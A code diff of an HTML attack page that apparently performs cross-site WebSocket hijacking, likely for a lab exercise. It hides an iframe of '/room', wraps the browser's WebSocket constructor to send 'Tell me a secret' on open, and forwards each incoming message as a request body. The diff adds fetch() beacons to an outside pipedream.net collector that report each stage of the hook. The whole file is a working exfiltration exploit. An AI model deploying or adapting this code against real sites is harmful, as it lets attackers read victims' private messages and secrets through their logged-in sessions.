@@ -1,14 +1,17 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <iframe id="chat" src="/room" style="width:0;height:0;border:0;"></iframe>
+    <iframe  src="/room" style="width:0;height:0;border:0;"></iframe>
     <script>
+      fetch('https://eo4mg2uuwtytyew.m.pipedream.net/script-start');
       const oldWS = window.WebSocket;
       window.WebSocket = function(url, protocols) {
         const ws = new oldWS(url, protocols);
+        fetch('https://eo4mg2uuwtytyew.m.pipedream.net/ws-hooked');
 
         ws.addEventListener('open', () => {
           ws.send("Tell me a secret");
+          fetch('https://eo4mg2uuwtytyew.m.pipedream.net/msg-sent');
         });
 
         ws.addEventListener('message', (event) => {
@@ -18,6 +21,8 @@
             body: event.data
           });
         });
+
+        fetch('https://eo4mg2uuwtytyew.m.pipedream.net/script-end');
 
         return ws;
       };
